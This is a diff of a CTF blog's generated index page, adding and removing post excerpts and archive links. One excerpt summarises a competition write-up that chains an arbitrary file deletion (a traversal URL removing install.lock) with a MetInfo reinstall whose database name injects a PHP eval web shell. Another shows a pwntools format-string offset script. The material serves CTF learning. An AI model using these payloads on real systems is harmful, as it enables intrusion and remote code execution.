@@ -341,6 +341,35 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href="/posts/42614/">
+            
+                <span>TokyoWesterns CTF</span>
+        </a>
+        <div class="abstract-content">
+            SimpleAuth123456789101112131415161718192021222324252627282930313233&lt;?phprequire_once 'flag.php';if (!empty($_SERVER['QUERY_STRING'])) &#123;    $query = $_SERVER['QUERY_STRING'];    $res = parse_str($query);    if (!empty($res['action']))&#123;        $action = $res['action'];    &#125;&#125;i...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/02</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href="/posts/27029/">
             
                 <span>0ctf2018-babyheap</span>
@@ -473,22 +502,17 @@ ip2long
                 <span>巅峰极客ctf</span>
         </a>
         <div class="abstract-content">
-            pentest
-御剑扫描
-
+            pentest御剑扫描
 经过目录扫描，发现file/file.php
 根据网页最后提示:
 12DELETE FILESorry,no filename!
 可以猜测存在任意文件删除漏洞。
-
 首先我们删除install.lock
 1http://c2a2868220484acaae0b962988dbecbbd872061666de4bc6.game.ichunqiu.com/file/file.php?file=...//config/install.lock
-
 重装metinfo，重装的时候数据库名填写 
 1met#*/@eval($_GET[1]);/*
 数据库密码为root
-
-执...
+执行shel...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -625,39 +649,6 @@ man命令允许执行命令
             <!-- date  -->
             <div class="abstract-date">
                 <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/21</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/54897/">
-            
-                <span>linux格式化字符串漏洞</span>
-        </a>
-        <div class="abstract-content">
-            
- offset.py
-
-12345678910111213from pwn import *context.log_level = &apos;debug&apos;def exec_fmt(payload):    p = process(&quot;./vuln&quot;)    p.sendline(payload)    info = p.recv()    p.close()    return infoautofmt = FmtStr(exec_fmt)print autofmt.offset
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/08</span>
             </div>
             <!-- tags  -->
             
@@ -1348,9 +1339,101 @@ man命令允许执行命令
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 40
+        Total : 44
         </div>
         <!-- search  -->
         
@@ -1363,6 +1446,26 @@ man命令允许执行命令
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/posts/18428/">lamp && lnmp以apt-get的方式安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span><a class="archive-post-title" href="/posts/7418/">WEBSEC-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/posts/42614/">TokyoWesterns CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1576,6 +1679,8 @@ man命令允许执行命令
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
